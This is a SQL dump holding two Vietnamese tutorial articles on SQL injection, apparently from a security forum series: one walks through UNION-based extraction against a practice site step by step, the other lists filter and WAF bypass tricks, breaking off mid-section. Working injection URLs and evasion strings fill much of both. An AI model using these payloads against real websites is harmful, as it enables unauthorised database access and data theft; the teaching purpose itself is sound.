INSERT INTO `contentmembers` (`id`, `title`, `url`, `content`, `image`, `author`, `view_count`, `reg_date`) VALUES
(74, 'Web4: SQL injection - Các bước khai thác', '', '<div class=\"bbWrapper\"><div style=\"text-align: center\"><span style=\"color: #ff0000\"><b><span style=\"font-size: 14px\">Web4: SQL injection - Các bước khai thác khác</span></b></span><br>​</div><br><br><br>\r\nCác chuyên đề nhỏ cùng chủ đề:<div style=\"margin-left: 20px\"><br>\r\n<a href=\"http://whitehat.vn/threads/5319-Web1-SQL-injection-Con-duong-khai-thac-pho-bien-qua-user-input.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5319-Web1-SQL-injection-Con-duong-khai-thac-pho-bien-qua-user-input.html&amp;hash=487292f344bc2c966ddc689238a7795d\"><b><span style=\"color: #0000ff\">Web1: SQL injection - Con đường khai thác phổ biến : qua “user input”</span></b></a><br>\r\n<b><a href=\"http://whitehat.vn/threads/5359-Web2-SQL-injection-Cac-con-duong-khai-thac-khac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5359-Web2-SQL-injection-Cac-con-duong-khai-thac-khac.html&amp;hash=5a245525ec2bb7550b25ff05ed4fe669\"><span style=\"color: #0000ff\">Web2: SQL injection - Các con đường khai thác khác</span></a><br>\r\n<a href=\"http://whitehat.vn/threads/threads/5410-Web3-SQL-injection-Cac-huong-khai-thac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2Fthreads%2F5410-Web3-SQL-injection-Cac-huong-khai-thac.html&amp;hash=392258836d81d5bfde2d69a2c24e0c4b\"><span style=\"color: #0000ff\">Web3: SQL injection - Kỹ thuật khai thác: Các hướng khai thác</span></a><br>\r\n<a href=\"http://whitehat.vn/threads/threads/5459-Web4-SQL-injection-Cac-buoc-khai-thac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2Fthreads%2F5459-Web4-SQL-injection-Cac-buoc-khai-thac.html&amp;hash=a55f13f13cecdb784c12756e0a998599\"><span style=\"color: #0000ff\">Web4: SQL injection - Kỹ thuật khai thác: Các bước khai thác</span></a><br>\r\n<a href=\"http://whitehat.vn/threads/5547-Web5-SQL-injection-Mot-so-ky-thuat-vuot-qua-co-che-loc.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5547-Web5-SQL-injection-Mot-so-ky-thuat-vuot-qua-co-che-loc.html&amp;hash=9aeb22d9e8522e0f3c2d6959150e2b9c\"><span style=\"color: #0000ff\">Web5: SQL injection - Kỹ thuật khai thác: Một số kỹ thuật vượt qua cơ chế lọc</span></a><br>\r\n<a href=\"http://whitehat.vn/threads/threads/5595-Web6-SQL-injection-Mot-so-tool-khai-thac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2Fthreads%2F5595-Web6-SQL-injection-Mot-so-tool-khai-thac.html&amp;hash=9105820be79b0f353d4b8a444b90f90a\"><span style=\"color: #0000ff\">Web6: SQL injection - Một số tools khai thác</span></a><br>\r\n<a href=\"http://whitehat.vn/threads/5636-Web7-SQL-injection-Cac-cach-phong-chong-ket-luan.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5636-Web7-SQL-injection-Cac-cach-phong-chong-ket-luan.html&amp;hash=257f0c1c1fcf570619ea40a28f5dbe06\"><span style=\"color: #0000ff\">Web7: SQL injection - Các cách phòng chống &amp; Kết luận.</span></a><br>\r\n============================================</b>​</div><b>1. Phát hiện</b><br><br>\r\nMột cách thông thường, để phát hiện một ứng dụng web có dính lỗi SQL injection hay không là thêm vào câu truy vấn các <i>meta character</i> trong các hệ quản trị cơ sở dữ liệu, chẳng hạn như dấu nháy đơn (<i>single quote</i>), dấu nháy kép (<i>double quote</i>), dấu chấm phẩy (<i>semi colon</i>) và các ký tự comment (<i>--, ##, /**/</i>)… và chờ xem ứng dụng web sẽ xứ lý câu truy vấn đó như thế nào.<br>\r\nCác bạn truy cập vào link sau:<a href=\"http://zerocoolhf.altervista.org/level1.php?id=1\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fzerocoolhf.altervista.org%2Flevel1.php%3Fid%3D1&amp;hash=85159df015298b671ca1807baf0492df\" rel=\"nofollow ugc noopener\"><span style=\"color: #0000ff\">http://zerocoolhf.altervista.org/level1.php?id=1</span></a><br>\r\n<div style=\"text-align: center\"><br>\r\n	<img src=\"Imageass/1490892992image0.JPG\"><br><br>\r\n​</div><br><br><br>\r\nThêm vào cuối liên kết trên một trong các <i>meta character</i> đã nói ở trên, chẳng hạn ta thêm vào dấu nháy đơn: <a href=\"http://zerocoolhf.altervista.org/level1.php?id=1\'\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fzerocoolhf.altervista.org%2Flevel1.php%3Fid%3D1%27&amp;hash=322db7adb9464f17e6590f8de438596d\" rel=\"nofollow ugc noopener\"><span style=\"color: #0000ff\">http://zerocoolhf.altervista.org/level1.php?id=1</span></a><a href=\"http://zerocoolhf.altervista.org/level1.php?id=1\'\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fzerocoolhf.altervista.org%2Flevel1.php%3Fid%3D1%27&amp;hash=322db7adb9464f17e6590f8de438596d\" rel=\"nofollow ugc noopener\"><span style=\"color: #0000ff\">\'</span></a>  \r\n<div style=\"text-align: center\"><br><br>\r\n<img src=\"Imageass/1490892992image1.JPG\"><br><br>\r\n</div><br><br><br>\r\nThông báo lỗi từ mysql xuất hiện, như vậy trang web này đã bị dính lỗi SQL injection.<br><br>\r\n<b>2. Thu thập thông tin về hệ quản trị cơ sở dữ liệu</b><br><br>\r\nKhi phát hiện ứng dụng bị dính lỗi SQL injection, công việc cần làm tiếp theo là thu thập thông tin về hệ quản trị cơ sở dữ liệu mà ứng dụng đang dùng, thông tin này bao gồm loại cơ sở dữ liệu (mysql, mssql, oracle…) và phiên bản của nó.<br>\r\nĐể xác định hệ loại quản trị mà ứng dụng đang sử dụng, chúng ta có thể đánh giá theo nhiều tiêu chí. Có thể đánh giá qua thông báo lỗi: <div style=\"text-align: center\"><br>\r\n<br>\r\n<img src=\"Imageass/1490892992image2.JPG\"><br><br><br>\r\nThông báo lỗi từ MS-SQL – IIS<br><br><br><br>\r\n<img src=\"Imageass/1490892992image3.JPG\">\r\n<br><br><br>\r\nThông báo lỗi từ MySQL – Apache<br>​</div><br><br>\r\nTrong trường hợp ở trên, thông báo lỗi cho biết ứng dụng web sử dụng MySQL.<br><br>\r\n<b>3. Xác định số lượng cột trong mệnh đề select</b><br><br>\r\nKhi khai thác SQL injection, chúng ta thường sử dụng một hay nhiều mệnh đề select phụ (<i>subselect</i>), điều này được thực hiện thông qua từ khóa <i>union</i>. <i>Union</i> là từ khóa dùng để gộp kết quả của nhiều mệnh đề select do đó trong mỗi mệnh đề select đòi hỏi số lượng các trường đều phải bằng nhau và đều bằng số lượng các trường được select trong mệnh đề select ban đầu. Xét một ví dụ cụ thể :  <div style=\"text-align: center\"><br><br>\r\n	<img src=\"Imageass/1490892992image4.JPG\"><br><br>\r\n<br>​</div><br><br>\r\nỞ đây, trong mệnh đề select ban đầu chọn ra 3 trường là <i>id, content và author</i>. Do đó mệnh đề select sau từ khóa union cũng cần phải có đúng 3 trường. Nếu số trường select ở mệnh đề select sau union không bằng số lượng các trường được select trong mệnh đề select đầu tiên, chúng ta sẽ nhận được thông báo lỗi. Vậy làm sao để biết để biết được chính xác mệnh đề select đầu tiền chọn ra bao nhiêu trường. Chúng ta có thể thực hiện thử dần bằng cách tăng dần số lượng cột trong mệnh đề select sau union (bắt đầu từ 1). Khi nào không thấy thông báo lỗi xuất hiện thì đó chính là số lượng cột cần tìm.<br><br>\r\nMột cách khác để làm điều này, nhanh chóng hơn đó là sử dụng \'<i>order by\'</i>. Trong các hệ quản trị cơ sở dữ liệu từ khóa \'<i>order by\'</i> được sử dụng để sắp xếp thứ tự cho các bản ghi thu được trong mệnh để select. Sau <i>order by</i> có thể là tên một cột để xác định rằng kết quả thu về sẽ được sắp xếp theo giá trị của cột đó (có thể tăng dần hay giảm dần). Sau <i>order by</i> cũng có thể là số thứ tự vị trí của cột đó. Nếu giá trị sau order lớn hơn số cột được select thì chúng ta sẽ thấy thông báo lỗi.<br><br>\r\nQuay lại với site bị dính lỗi SQL injection ở trên, ta dùng \'order by \', tăng dần  để xác định số cột.<br>\r\n<a href=\"http://zerocoolhf.altervista.org/level1.php?id=1%27%20order%20by%201--%20-\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fzerocoolhf.altervista.org%2Flevel1.php%3Fid%3D1%2527%2520order%2520by%25201--%2520-&amp;hash=64a5eaf4d50d54fde9ff7bc8699d6e1e\" rel=\"nofollow ugc noopener\"><span style=\"color: #0000ff\">http://zerocoolhf.altervista.org/level1.php?id=1\' order by 1-- -</span></a> =&gt; ok<br>\r\n<a href=\"http://zerocoolhf.altervista.org/level1.php?id=1%27%20order%20by%202--%20-\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fzerocoolhf.altervista.org%2Flevel1.php%3Fid%3D1%2527%2520order%2520by%25202--%2520-&amp;hash=5db4c2b254ef7037ab6947b3d05c4296\" rel=\"nofollow ugc noopener\"><span style=\"color: #0000ff\">http://zerocoolhf.altervista.org/level1.php?id=1\' order by 2-- -</span></a>=&gt; ok<br>\r\n<a href=\"http://zerocoolhf.altervista.org/level1.php?id=1%27%20order%20by%203--%20-\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fzerocoolhf.altervista.org%2Flevel1.php%3Fid%3D1%2527%2520order%2520by%25203--%2520-&amp;hash=a291cf6dfd3318950299af95eda5f3e3\" rel=\"nofollow ugc noopener\"><span style=\"color: #0000ff\">http://zerocoolhf.altervista.org/level1.php?id=1\' order by 3-- -</span></a> =&gt; ok  <div style=\"text-align: center\"><br>\r\n<br>\r\n<img src=\"Imageass/1490892992image5.JPG\"><br><br>\r\n<br>​</div><br><br>\r\nTiếp tục: <a href=\"http://zerocoolhf.altervista.org/level1.php?id=1%27%20order%20by%204--%20-\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fzerocoolhf.altervista.org%2Flevel1.php%3Fid%3D1%2527%2520order%2520by%25204--%2520-&amp;hash=f07fb8a299aca3ef69ab1226280f6da4\" rel=\"nofollow ugc noopener\"><span style=\"color: #0000ff\">http://zerocoolhf.altervista.org/level1.php?id=1\' order by 4-- -</span></a> =&gt; xuất hiện lỗi.  <div style=\"text-align: center\"><br>\r\n<br>\r\n<img src=\"Imageass/1490892992image6.JPG\">\r\n<br><br>​</div><br><br><br>\r\nNhư vậy, ta xác định được số cột là 3.<br><br>\r\n<b>4. Xác định thông tin</b><br><br>\r\nSau khi lấy được các thông tin cơ bản, chúng ta sẽ tiến hành khai thác SQL injection để lấy cơ sở dữ liệu hay thực hiện những hành vi khác thông qua lỗ hổng này.<br>\r\n<br>\r\nXác định tên bảng, cột: chúng ta có nhiều cách để làm được công việc này, một trong những cách đó là “<i>đoán</i>” vì nó nhanh chóng và trong những trường hợp cụ thể, đây là cách rất hữu ích. Ví dụ: một số tên bảng thông dụng như : <i>user, users, admin, administrator</i><i>, staff, account, manager</i>… (chú ý tiền tố <i>tbl_</i> rất hay được các lập trình viên sử dụng để đặt cho tên bảng).<br>\r\n<br>\r\nMột cách chính qui hơn để biết được tên bảng, tên cột là sử dụng đối tượng <a href=\"http://en.wikipedia.org/wiki/Information_schema\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fen.wikipedia.org%2Fwiki%2FInformation_schema&amp;hash=5fa08a4e6460b49d780d285acc9d39ac\" rel=\"nofollow ugc noopener\"><span style=\"color: #0000ff\">information_schema</span></a>. Đối tượng này cung cấp các thông tin về tables, columns, views và procedures… của cơ sở dữ liệu.<br>\r\n<br>\r\nBây giờ, trở lại site <a href=\"http://zerocoolhf.altervista.org/level1.php?id=1\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fzerocoolhf.altervista.org%2Flevel1.php%3Fid%3D1&amp;hash=85159df015298b671ca1807baf0492df\" rel=\"nofollow ugc noopener\"><span style=\"color: #0000ff\">http://zerocoolhf.altervista.org/level1.php?id=1</span></a><br>\r\nTruy vấn SQL với URL trên có số cột là 3 (đã xác định ở trên).<br>\r\nTiến hành request với URL sau: <a href=\"http://zerocoolhf.altervista.org/level1.php?id=-1%27%20union%20select%201,2,3--%20-\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fzerocoolhf.altervista.org%2Flevel1.php%3Fid%3D-1%2527%2520union%2520select%25201%2C2%2C3--%2520-&amp;hash=4a3545e8161498117729203423d4268b\" rel=\"nofollow ugc noopener\"><span style=\"color: #0000ff\">http://zerocoolhf.altervista.org/level1.php?id=-1\' union select 1,2,3-- -</span></a>  <div style=\"text-align: center\"><br>\r\n<br>\r\n	<img src=\"Imageass/1490892992image7.JPG\">\r\n<br><br>​</div><br><br><br>\r\nLỗi trả về cho ta thấy có vẻ như ‘unio’ đã bị xóa mất.<br>\r\nThử lại với request: <a href=\"http://zerocoolhf.altervista.org/level1.php?id=-1%27%20uniounion%20select%201,2,3--%20-\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fzerocoolhf.altervista.org%2Flevel1.php%3Fid%3D-1%2527%2520uniounion%2520select%25201%2C2%2C3--%2520-&amp;hash=9a033cc58348747ea30738ffc8e28571\" rel=\"nofollow ugc noopener\"><span style=\"color: #0000ff\">http://zerocoolhf.altervista.org/level1.php?id=-1\' uniounion select 1,2,3-- -</span></a>  <div style=\"text-align: center\"><br>\r\n<br>\r\n	<img src=\"Imageass/1490892992image8.JPG\"><br><br>\r\n<br>​</div><br><br>\r\nThành công. Ta thấy cột số 2 và 3 bị lỗi.<br>\r\nLấy phiên bản của hệ quản trị cơ sở dữ liệu và tên cơ sở dữ liệu:<br>\r\n<a href=\"http://zerocoolhf.altervista.org/level1.php?id=-1%27%20uniounion%20select%201,version(),database()--%20-\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fzerocoolhf.altervista.org%2Flevel1.php%3Fid%3D-1%2527%2520uniounion%2520select%25201%2Cversion%28%29%2Cdatabase%28%29--%2520-&amp;hash=38c5e7d4614caf05a846faed8d6ddd37\" rel=\"nofollow ugc noopener\"><span style=\"color: #0000ff\">http://zerocoolhf.altervista.org/level1.php?id=-1\' uniounion select 1,version(),database()-- -</span></a>  <div style=\"text-align: center\"><br>\r\n<br>\r\n<img src=\"Imageass/1490892992image9.JPG\"><br><br>\r\n<br>​</div><br><br>\r\nNhư vậy tên cơ sở dữ liệu là <i>my_zerocoolhf</i> và phiên bản của hệ quản trị cơ sở dữ liệu là MySQL <i>5.1.71-community-log.</i><br>\r\nTiếp tục, lấy tên các bảng trong cơ sở dữ liệu:<br>\r\n<a href=\"http://zerocoolhf.altervista.org/level1.php?id=-1%27%20uniounion%20select%20all%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--%20-\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fzerocoolhf.altervista.org%2Flevel1.php%3Fid%3D-1%2527%2520uniounion%2520select%2520all%25201%2Cgroup_concat%28table_name%29%2C3%2520from%2520information_schema.tables%2520where%2520table_schema%3Ddatabase%28%29--%2520-&amp;hash=b1e0d24a50af23271068711b8829e21e\" rel=\"nofollow ugc noopener\"><span style=\"color: #0000ff\">http://zerocoolhf.altervista.org/level1.php?id=-1\' uniounion select all 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- -</span></a>  <div style=\"text-align: center\"><br>\r\n<br>\r\n	<img src=\"Imageass/1490892992image10.JPG\"><br><br>\r\n<br>​</div><br><br>\r\nCơ sở dữ liệu có 2 bảng là <i>auth</i> và <i>book</i>. Chúng ta sẽ thử lấy nội dung các bản ghi trong bảng <i>book</i>. Trước hết xác định các trường của bảng <i>book</i>.<br>\r\nThực hiện request:<br>\r\n<a href=\"http://zerocoolhf.altervista.org/level1.php?id=-1%27%20uniounion%20select%20all%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=0x626f6f6b--%20-\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fzerocoolhf.altervista.org%2Flevel1.php%3Fid%3D-1%2527%2520uniounion%2520select%2520all%25201%2Cgroup_concat%28column_name%29%2C3%2520from%2520information_schema.columns%2520where%2520table_name%3D0x626f6f6b--%2520-&amp;hash=355fea2862c8f355db502aebaab592d7\" rel=\"nofollow ugc noopener\"><span style=\"color: #0000ff\">http://zerocoolhf.altervista.org/level1.php?id=-1\' uniounion select all 1,group_concat(column_name),3 from information_schema.columns where table_name=0x626f6f6b-- -</span></a><br>\r\n(<i>0x626f6f6b</i> là mã hex của tên bảng <i>book,</i> tương tự nếu muốn lấy tên các trường của bảng <i>auth</i> thì chỉ cần thay mã hex của <i>auth</i> vào vị trí của <i>0x626f6f6b</i>)  <div style=\"text-align: center\"><br>\r\n<br>\r\n	<img src=\"Imageass/1490892992image11.JPG\"><br><br>\r\n<br>​</div><br><br>\r\nTên các trường: <i>id, title, price, author</i>. Bây giờ ta sẽ lấy nội dung các bản ghi trong cơ sở dữ liệu:<br>\r\n<a href=\"http://zerocoolhf.altervista.org/level1.php?id=-1%27%20uniounion%20select%20all%201,group_concat(id,0x3a,title,0x3a,price,0x3a,author),3%20from%20book--%20-\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fzerocoolhf.altervista.org%2Flevel1.php%3Fid%3D-1%2527%2520uniounion%2520select%2520all%25201%2Cgroup_concat%28id%2C0x3a%2Ctitle%2C0x3a%2Cprice%2C0x3a%2Cauthor%29%2C3%2520from%2520book--%2520-&amp;hash=0bc9d1bb1cf22b5c2707d70da0dfd469\" rel=\"nofollow ugc noopener\"><span style=\"color: #0000ff\">http://zerocoolhf.altervista.org/level1.php?id=-1\' uniounion select all 1,group_concat(id,0x3a,title,0x3a,price,0x3a,autho r),3 from book-- -</span></a><br>\r\n(<i>group_concat </i>để nối nhiều giá trị với nhau. 0x3a là dấu “:”, để ngăn cách cho dễ nhìn)  <div style=\"text-align: center\"><br>\r\n<br>\r\n	<img src=\"Imageass/1490892992image12.JPG\"><br><br>\r\n<br>​</div><br><br>\r\nNhư vậy, ta có thể lấy được toàn bộ cơ sở dữ liệu của site bị lỗi SQL injection.<br><br>\r\nCác bạn quan tâm có thể theo dõi chuyên đề tiếp theo - “<a href=\"http://whitehat.vn/threads/5547-Web5-SQL-injection-Mot-so-ky-thuat-vuot-qua-co-che-loc.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5547-Web5-SQL-injection-Mot-so-ky-thuat-vuot-qua-co-che-loc.html&amp;hash=9aeb22d9e8522e0f3c2d6959150e2b9c\"><span style=\"color: #0000ff\"><b>Web5: SQL injection - Kỹ thuật khai thác: Một số kỹ thuật vượt qua cơ chế lọc</b></span></a>”</div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(75, 'Web5: SQL injection - Một số kỹ thuật vượt qua cơ chế lọc', '', '<div class=\"bbWrapper\"><div style=\"text-align: center\"><span style=\"color: #ff0000\"><b><span style=\"font-size: 14px\">Web5: SQL injection - Một số kỹ thuật vượt qua cơ chế lọc</span><br>\r\n    <br>\r\n    </b></span>​</div><br>\r\n    Các chuyên đề nhỏ cùng chủ đề:<div style=\"margin-left: 20px\"><b><a href=\"http://whitehat.vn/threads/5319-Web1-SQL-injection-Con-duong-khai-thac-pho-bien-qua-user-input.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5319-Web1-SQL-injection-Con-duong-khai-thac-pho-bien-qua-user-input.html&amp;hash=487292f344bc2c966ddc689238a7795d\"><br>\r\n    </a></b><a href=\"http://whitehat.vn/threads/5319-Web1-SQL-injection-Con-duong-khai-thac-pho-bien-qua-user-input.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5319-Web1-SQL-injection-Con-duong-khai-thac-pho-bien-qua-user-input.html&amp;hash=487292f344bc2c966ddc689238a7795d\"><b><span style=\"color: #0000ff\">Web1: SQL injection - Con đường khai thác phổ biến : qua “user input”</span></b></a><b><br>\r\n    <a href=\"http://whitehat.vn/threads/5359-Web2-SQL-injection-Cac-con-duong-khai-thac-khac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5359-Web2-SQL-injection-Cac-con-duong-khai-thac-khac.html&amp;hash=5a245525ec2bb7550b25ff05ed4fe669\"><span style=\"color: #0000ff\">Web2: SQL injection - Các con đường khai thác khác</span></a><br>\r\n    <a href=\"http://whitehat.vn/threads/threads/5410-Web3-SQL-injection-Cac-huong-khai-thac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2Fthreads%2F5410-Web3-SQL-injection-Cac-huong-khai-thac.html&amp;hash=392258836d81d5bfde2d69a2c24e0c4b\"><span style=\"color: #0000ff\">Web3: SQL injection - Kỹ thuật khai thác: Các hướng khai thác</span></a><br>\r\n    <a href=\"http://whitehat.vn/threads/threads/5459-Web4-SQL-injection-Cac-buoc-khai-thac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2Fthreads%2F5459-Web4-SQL-injection-Cac-buoc-khai-thac.html&amp;hash=a55f13f13cecdb784c12756e0a998599\"><span style=\"color: #0000ff\">Web4: SQL injection - Kỹ thuật khai thác: Các bước khai thác</span></a><br>\r\n    <a href=\"http://whitehat.vn/threads/5547-Web5-SQL-injection-Mot-so-ky-thuat-vuot-qua-co-che-loc.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5547-Web5-SQL-injection-Mot-so-ky-thuat-vuot-qua-co-che-loc.html&amp;hash=9aeb22d9e8522e0f3c2d6959150e2b9c\"><span style=\"color: #0000ff\">Web5: SQL injection - Kỹ thuật khai thác: Một số kỹ thuật vượt qua cơ chế lọc</span></a><br>\r\n    <a href=\"http://whitehat.vn/threads/threads/5595-Web6-SQL-injection-Mot-so-tool-khai-thac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2Fthreads%2F5595-Web6-SQL-injection-Mot-so-tool-khai-thac.html&amp;hash=9105820be79b0f353d4b8a444b90f90a\"><span style=\"color: #0000ff\">Web6: SQL injection - Một số tools khai thác</span></a><br>\r\n    <a href=\"http://whitehat.vn/threads/5636-Web7-SQL-injection-Cac-cach-phong-chong-ket-luan.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2F5636-Web7-SQL-injection-Cac-cach-phong-chong-ket-luan.html&amp;hash=257f0c1c1fcf570619ea40a28f5dbe06\"><span style=\"color: #0000ff\">Web7: SQL injection - Các cách phòng chống &amp; Kết luận.</span></a><br>\r\n    ============================================</b>​</div><br>\r\n    <br>\r\n    <b>1. Cắt bớt nội dung câu truy vấn<br>\r\n    </b><br>\r\n    Trong trường hợp muốn lờ đi những đoạn <i>script</i> trong câu truy vấn. Ví dụ đối với đoạn xử lý dưới đây, trong câu truy vấn đòi hỏi điều kiện <i>active=1</i> nhưng chúng ta có thể <i>comment (--, -- -, -+, #, /*, /**/, //, ;%00…)</i> và lờ nó đi. Khi khai thác chúng ta thường không biết nội dung còn lại của câu truy vấn làm công việc gì nên sử dụng <i>comment</i> trong trường hợp này rất hiệu quả.<div style=\"text-align: center\">\r\n            \r\n            <img src=\"Imageass/1490892997image1.JPG\">\r\n    <br>\r\n    <br>​</div>Sau khi <i>comment</i>, truy vấn của chúng ta trở thành:<div style=\"text-align: center\"><div class=\"bbImageWrapper  js-lbImage\" title=\"1490892997image2.JPG\" data-src=\"https://whitehat.vn/image/xenforo_image/1490892997image2.JPG\" data-lb-sidebar-href=\"\" data-lb-caption-extra-html=\"\" data-single-image=\"1\">\r\n            <img src=\"Imageass/1490892997image2.JPG\">\r\n        </div>\r\n    <br>\r\n    <br>​</div><b>2. Bypass việc lọc các từ khóa</b><br>\r\n    <b>a. Inline Comment<br>\r\n    </b><br>\r\n    <i>Inline comment</i> được sử dụng rất hiệu quả trong việc <i>bypass</i> lọc các khoảng trắng. Có thể sử dụng các kí tự sau để bypass lọc khoảng trắng: <i>/**/, %20, %09, %0a, %0b, %0c, %0d, %a0</i>). Ví dụ:<br>\r\n    <div style=\"text-align: center\">\r\n            <img src=\"Imageass/1490892997image3.JPG\">\r\n    <br><br>\r\n    ​</div>\r\n    Hay <i>bypass</i> lọc các từ khóa (<i>khả dụng với MySql</i>). Trong ví dụ dưới đây, từ khóa <i>union</i> và <i>password</i> nằm trong <i>blacklist</i> nên đã bị chặn, chúng ta có thể bypass bằng cách:<div style=\"text-align: center\">\r\n            <img src=\"Imageass/1490892997image4.JPG\">\r\n    <br>\r\n    <br>​</div><b>b. Thay thế các từ khóa<br>\r\n    </b><br>\r\n    Khi khai thác SQL injection chúng ta thường sử dụng những từ khóa như: <i>union, select, information_schema...</i> Nhiều trường hợp người lập trình chỉ đơn giản là thay thế những từ khóa đó đi:<br>\r\n    <div style=\"text-align: center\"><br>\r\n<img src=\"Imageass/1490892997Capture.JPG\"><br>\r\n    <br>​</div>Chúng ta dễ dàng nhận thấy rằng đoạn mã xử lý trên còn thiếu xót. Nếu đơn thuần chỉ là <i>pattern matching</i> thì cách <i>bypass</i> cực kỳ đơn giản. Chúng ta hãy áp dụng <i>case sensitive</i>, khi đó chữ viết hoa và viết thường được hiểu khác nhau. <br>\r\n    Lúc này thay vì sử dụng từ khóa:<br>\r\n    <div class=\"bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code\">\r\n        <div class=\"bbCodeBlock-title\">\r\n            HTML:\r\n        </div>\r\n        <div class=\"bbCodeBlock-content\" dir=\"ltr\">\r\n            <pre class=\"bbCodeCode language-html\" dir=\"ltr\" data-xf-init=\"code-block\" data-lang=\"html\"><code class=\" language-html\">select, union…</code></pre>\r\n        </div>\r\n    </div>Chúng ta sẽ sử dụng:<br>\r\n    <div class=\"bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code\">\r\n        <div class=\"bbCodeBlock-title\">\r\n            HTML:\r\n        </div>\r\n        <div class=\"bbCodeBlock-content\" dir=\"ltr\">\r\n            <pre class=\"bbCodeCode language-html\" dir=\"ltr\" data-xf-init=\"code-block\" data-lang=\"html\"><code class=\" language-html\">SeLEcT, UniOn…</code></pre>\r\n        </div>\r\n    </div>Cơ sở của cách <i>bypass</i> này là những hệ quản trị cơ sở dữ liệu không phân biệt hoa thường với những từ khóa.<br>\r\n    Trong một số trường hợp, ứng dụng web sẽ lọc bỏ toàn bộ hay một phần từ khóa nào đó (union, select…). Ta sẽ bypass như sau:<br>\r\n    <div class=\"bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code\">\r\n        <div class=\"bbCodeBlock-title\">\r\n            HTML:\r\n        </div>\r\n        <div class=\"bbCodeBlock-content\" dir=\"ltr\">\r\n            <pre class=\"bbCodeCode language-html\" dir=\"ltr\" data-xf-init=\"code-block\" data-lang=\"html\"><code class=\" language-html\">id=1+uniunionon+SeLselectecT+1,2,3-- -</code></pre>\r\n        </div>\r\n    </div>Sau khi union, select bị lọc bỏ bởi ứng dụng web, ta sẽ còn lại câu truy vấn đúng như sau:<br>\r\n    <div class=\"bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code\">\r\n        <div class=\"bbCodeBlock-title\">\r\n            HTML:\r\n        </div>\r\n        <div class=\"bbCodeBlock-content\" dir=\"ltr\">\r\n            <pre class=\"bbCodeCode language-html\" dir=\"ltr\" data-xf-init=\"code-block\" data-lang=\"html\"><code class=\" language-html\">id=1+union+SeLecT+1,2,3-- -</code></pre>\r\n        </div>\r\n    </div><br>\r\n    <b>c. Character encoding<br>\r\n    </b><br>\r\n    Chúng ta có thể bypass khi WAF (Web Application Firewall) chặn các từ khóa bằng cách encode chúng. Rất nhiều ứng dụng WAF sẽ chỉ decode truy vấn một lần và lọc bỏ các từ khóa trong blacklist, khi đó chúng ta hãy encode 2 lần request như vậy có thể bypass được trong trường hợp này.<br>\r\n    <div style=\"text-align: center\"><br>\r\n    <img src=\"Imageass/1490892997image5.JPG\"><br>\r\n    <br>​</div><b>3. Bypass chặn nháy đơn, nháy kép<br>\r\n    </b><br>\r\n    - Chúng ta hãy xét một ví dụ trước khi tìm hiểu cụ thể cách <i>bypass</i> này.<br>\r\n     <div style=\"text-align: center\"><br>\r\n    <img src=\"Imageass/1490892997image6.JPG\"><br>\r\n    <br>​</div>Trong kịch bản này, chúng ta đã biết được một bảng trong cơ sở dữ liệu có tên là <i>users</i>. 